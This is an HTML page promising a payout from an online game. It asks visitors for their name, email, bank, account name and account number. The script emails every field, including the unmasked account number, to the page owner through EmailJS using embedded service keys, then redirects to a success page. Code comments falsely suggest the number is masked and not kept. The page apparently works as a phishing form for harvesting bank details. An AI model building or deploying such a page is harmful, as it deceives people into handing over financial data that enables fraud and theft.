<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Receiving Payment from Online Game</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f5f7fa;
      margin: 0;
      padding: 0;
    }
    header {
      background: linear-gradient(90deg, #2575fc, #6a11cb);
      color: white;
      text-align: center;
      padding: 20px;
    }
    header h1 { margin: 0; font-size: 24px; }
    .container {
      max-width: 560px;
      margin: 30px auto;
      background: #fff;
      padding: 22px;
      border-radius: 12px;
      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
    }
    h2 { text-align:center; margin-bottom:18px; color:#333; }
    label { display:block; margin:12px 0 6px; font-weight:600; }
    input, select {
      width:100%; padding:12px; border:1px solid #dbe3ee; border-radius:8px;
      font-size:15px; margin-bottom:10px; background:#fbfdff;
    }
    input:focus, select:focus { outline:none; box-shadow:0 6px 18px rgba(37,117,252,0.08); border-color:#2575fc; }
    button {
      width:100%; background:linear-gradient(90deg,#28a745,#218838); color:#fff; padding:14px;
      border:none; border-radius:8px; font-size:16px; font-weight:700; cursor:pointer;
    }
    button:hover { opacity:0.95; transform:translateY(-1px); }
    .status { text-align:center; margin-top:14px; font-weight:600; color:#333; }
    .payment-img { display:block; margin:0 auto 14px; width:86px; }
    @media (max-width:520px) {
      .container { margin:18px; padding:16px; }
    }
  </style>
</head>
<body>
  <header>
    <h1>üí≥ Receiving Payment from Online Game</h1>
  </header>

  <div class="container">
    <img src="https://cdn-icons-png.flaticon.com/512/2331/2331941.png" alt="Payment" class="payment-img">
    <h2>Enter Your Bank Details</h2>

    <form id="paymentForm">
      <label>Full Name</label>
      <input type="text" name="full_name" placeholder="Enter your full name" required>

      <label>Email</label>
      <input type="email" name="email" placeholder="Enter your email" required>

      <label>Bank</label>
      <select name="bank" required>
        <option value="">-- Select Bank --</option>
        <option value="Zenith Bank">Zenith Bank</option>
        <option value="First Bank">First Bank</option>
        <option value="UBA Bank">UBA Bank</option>
      </select>

      <label>Account Name</label>
      <input type="text" name="account_name" placeholder="Enter your account name" required>

      <label>Account Number</label>
      <input type="text" name="account_number" placeholder="Enter your account number" inputmode="numeric" required>

      <button type="submit">Submit</button>
    </form>

    <div id="formStatus" class="status" aria-live="polite"></div>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
  <script>
    (function(){
      // initialize with your PUBLIC KEY (replace if different)
      emailjs.init("RLtZ_3M8jZolNXTh3");
    })();

    document.getElementById('paymentForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const form = this;

      // read values to create a safe preview (we'll mask account number)
      const fd = new FormData(form);
      const fullName = (fd.get('full_name') || '').trim();
      const bank = (fd.get('bank') || '').trim();
      const accountName = (fd.get('account_name') || '').trim();
      const accNumber = (fd.get('account_number') || '').trim();

      // build masked account preview (not storing full number)
      const maskedAcct = accNumber ? (accNumber.length > 4 ? '‚Ä¢‚Ä¢‚Ä¢‚Ä¢' + accNumber.slice(-4) : accNumber) : '';

      // Send via EmailJS (service/template you set up)
      emailjs.sendForm("service_8t4rx1b", "template_amyys18", form)
        .then(function(response) {
          // prepare a non-sensitive preview for the success page
          try {
            const preview = {
              full_name: fullName || '',
              bank: bank || '',
              account_name: accountName || '',
              masked_account: maskedAcct
            };
            sessionStorage.setItem('payout_preview', JSON.stringify(preview));
          } catch (err) {
            // ignore storage errors
            console.warn('sessionStorage failed', err);
          }

          // redirect to success page
          window.location.href = 'success.html';
        }, function(error) {
          console.error('EmailJS send failed', error);
          document.getElementById('formStatus').innerHTML =
            "<span style='color:#c53030'>‚ùå Failed to submit. Please try again.</span>";
        });
    });
  </script>
</body>
</html>
